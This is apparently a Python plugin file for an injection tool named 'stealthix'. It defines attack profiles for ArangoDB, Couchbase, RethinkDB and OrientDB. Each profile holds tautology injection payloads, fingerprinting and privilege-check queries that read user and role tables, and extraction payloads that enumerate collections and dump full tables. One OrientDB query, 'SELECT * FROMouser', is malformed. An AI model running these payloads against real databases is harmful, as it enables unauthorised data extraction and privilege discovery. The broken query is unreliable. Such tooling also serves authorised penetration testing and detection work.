from __future__ import annotations

from stealthix.plugins.base import Plugin

DOCUMENT_PLUGINS = [
    Plugin(
        "arangodb",
        "nosql",
        dbms="arangodb",
        payloads=[
            'FOR doc IN collection FILTER doc.field == "1" RETURN doc',
            "FOR doc IN collection FILTER 1==1 RETURN doc",
        ],
        fingerprints=["arangodb", "aql"],
        error_signatures=["arangodb", "aql", "syntax error"],
        version_queries=["RETURN db._version()", "RETURN db._engine().version()"],
        privilege_checks=["RETURN db._users()", "RETURN db._databases()"],
        os_queries=["RETURN db._engine().version()"],
        preferred_techniques="BET",
        extraction_profiles={
            "databases": {
                "payloads": ["RETURN db._databases()", "SHOW DATABASES"],
                "patterns": [r"\bdatabase[:=\s]+([a-z0-9_\-]+)", r"\bdb[:=\s]+([a-z0-9_\-]+)"],
            },
            "tables": {
                "payloads": ["FOR c IN db._collections() RETURN c.name", "SHOW COLLECTIONS"],
                "patterns": [r"\bcollection[:=\s]+([a-z0-9_\-]+)", r"\btable[:=\s]+([a-z0-9_\-]+)"],
            },
            "columns": {
                "payloads": [
                    "FOR doc IN collection LIMIT 1 RETURN KEYS(doc)",
                    "FOR doc IN collection LIMIT 1 RETURN ATTRIBUTES(doc)",
                ],
                "patterns": [r"\bfield[:=\s]+([a-z0-9_\-]+)", r"\bcolumn[:=\s]+([a-z0-9_\-]+)"],
            },
            "dump": {
                "payloads": [
                    "FOR doc IN collection FILTER 1==1 RETURN doc",
                    "FOR doc IN collection RETURN doc",
                ],
            },
            "files": {"disabled": True},
            "os": {"disabled": True},
        },
    ),
    Plugin(
        "couchbase",
        "nosql",
        dbms="couchbase",
        payloads=['SELECT * FROM bucket WHERE field = "1"', "SELECT * FROM bucket WHERE 1=1"],
        fingerprints=["couchbase", "n1ql"],
        error_signatures=["couchbase", "n1ql", "syntax error"],
        version_queries=["SELECT version()", "SELECT * FROM system:keyspaces"],
        privilege_checks=["SELECT * FROM system:user_info", "SELECT * FROM system:roles"],
        os_queries=["SELECT * FROM system:nodes"],
        preferred_techniques="BET",
        extraction_profiles={
            "databases": {
                "payloads": ["SELECT * FROM system:keyspaces", "SHOW BUCKETS"],
                "patterns": [r"\bbucket[:=\s]+([a-z0-9_\-]+)", r"\bdatabase[:=\s]+([a-z0-9_\-]+)"],
            },
            "tables": {
                "payloads": ["SELECT * FROM system:keyspaces", "SHOW COLLECTIONS"],
                "patterns": [r"\bcollection[:=\s]+([a-z0-9_\-]+)", r"\btable[:=\s]+([a-z0-9_\-]+)"],
            },
            "columns": {
                "payloads": [
                    "SELECT * FROM bucket LIMIT 1",
                    "SELECT * FROM information_schema.columns",
                ],
                "patterns": [r"\bfield[:=\s]+([a-z0-9_\-]+)", r"\bcolumn[:=\s]+([a-z0-9_\-]+)"],
            },
            "dump": {
                "payloads": ["SELECT * FROM bucket WHERE 1=1", "SELECT * FROM bucket"],
            },
            "files": {"disabled": True},
            "os": {"disabled": True},
        },
    ),
    Plugin(
        "rethinkdb",
        "nosql",
        dbms="rethinkdb",
        payloads=[
            'r.table("table").filter({"field": "1"})',
            'r.table("table").filter(r.row("field").eq("1"))',
        ],
        fingerprints=["rethinkdb", "reql"],
        error_signatures=["rethinkdb", "reql", "runtime error"],
        version_queries=["r.version()", 'r.db("rethinkdb").table("server_config").run()'],
        privilege_checks=[
            'r.db("rethinkdb").table("users").run()',
            'r.db("rethinkdb").table("permissions").run()',
        ],
        os_queries=['r.db("rethinkdb").table("server_status").run()'],
        preferred_techniques="BET",
        extraction_profiles={
            "databases": {
                "payloads": ["r.dbList()", "r.db_list()"],
                "patterns": [r"\bdatabase[:=\s]+([a-z0-9_\-]+)", r"\bdb[:=\s]+([a-z0-9_\-]+)"],
            },
            "tables": {
                "payloads": ['r.db("db").tableList()', 'r.db("db").table_list()'],
                "patterns": [r"\btable[:=\s]+([a-z0-9_\-]+)", r"\bcollection[:=\s]+([a-z0-9_\-]+)"],
            },
            "columns": {
                "payloads": [
                    'r.db("db").table("table").limit(1)',
                    'r.db("db").table("table").coerceTo("array")',
                ],
                "patterns": [r"\bfield[:=\s]+([a-z0-9_\-]+)", r"\bcolumn[:=\s]+([a-z0-9_\-]+)"],
            },
            "dump": {
                "payloads": [
                    'r.db("db").table("table").filter(r.row.ne(null))',
                    'r.db("db").table("table")',
                ],
            },
            "files": {"disabled": True},
            "os": {"disabled": True},
        },
    ),
    Plugin(
        "orientdb",
        "nosql",
        dbms="orientdb",
        payloads=['SELECT * FROM table WHERE field = "1"', "SELECT * FROM table WHERE 1=1"],
        fingerprints=["orientdb", "orient"],
        error_signatures=["orientdb", "orient", "syntax error"],
        version_queries=["SELECT version()", "SELECT * FROM metadata:database"],
        privilege_checks=["SELECT * FROMouser", "SELECT * FROM orole"],
        os_queries=["SELECT * FROM sysinfo"],
        preferred_techniques="BETU",
        extraction_profiles={
            "databases": {
                "payloads": ["LIST DATABASES", "SELECT name FROM database"],
                "patterns": [r"\bdatabase[:=\s]+([a-z0-9_\-]+)", r"\bdb[:=\s]+([a-z0-9_\-]+)"],
            },
            "tables": {
                "payloads": ["SELECT * FROM class", "LIST CLASSES"],
                "patterns": [r"\bclass[:=\s]+([a-z0-9_\-]+)", r"\btable[:=\s]+([a-z0-9_\-]+)"],
            },
            "columns": {
                "payloads": [
                    "SELECT * FROM table LIMIT 1",
                    'SELECT * FROM property WHERE class.name = "table"',
                ],
                "patterns": [r"\bfield[:=\s]+([a-z0-9_\-]+)", r"\bcolumn[:=\s]+([a-z0-9_\-]+)"],
            },
            "dump": {
                "payloads": ["SELECT * FROM table WHERE 1=1", "SELECT FROM table"],
            },
            "files": {"disabled": True},
            "os": {"disabled": True},
        },
    ),
]

__all__ = ["DOCUMENT_PLUGINS"]
